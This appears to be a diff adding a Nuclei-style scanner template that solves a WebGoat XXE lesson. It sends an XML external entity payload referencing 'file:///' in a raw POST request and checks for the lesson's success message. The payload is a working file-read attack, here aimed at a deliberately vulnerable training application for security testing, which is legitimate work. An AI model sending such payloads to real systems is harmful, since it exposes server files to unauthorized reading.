@@ -1,0 +1,43 @@
+id: a5-xxe-3
+
+info:
+  name: Testing a5-xxe-3
+  author: security-researcher
+  severity: high
+
+variables:
+  payload_1: '<!DOCTYPE comment [ <!ENTITY rootpath SYSTEM "file:///"> ]>'
+  payload_2: "&rootpath;"
+  success_message: "Congratulations. You have successfully completed the assignment."
+
+http:
+  - id: send_payload
+    raw:
+      - |
+        POST /WebGoat/xxe/simple HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Accept: */*
+        User-Agent: Mozilla/5.0 (Security Testing)
+        
+        <?xml version="1.0"?>
+        {{payload_1}}
+        <comment>  
+          <text>{{payload_2}}</text>
+        </comment>
+
+    cookie-reuse: true
+    redirects: true
+
+    extractors:
+      - type: json
+        part: body
+        name: test_payload
+        json:
+          - '"lessonCompleted: \(.lessonCompleted)"'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, success_message)'
+
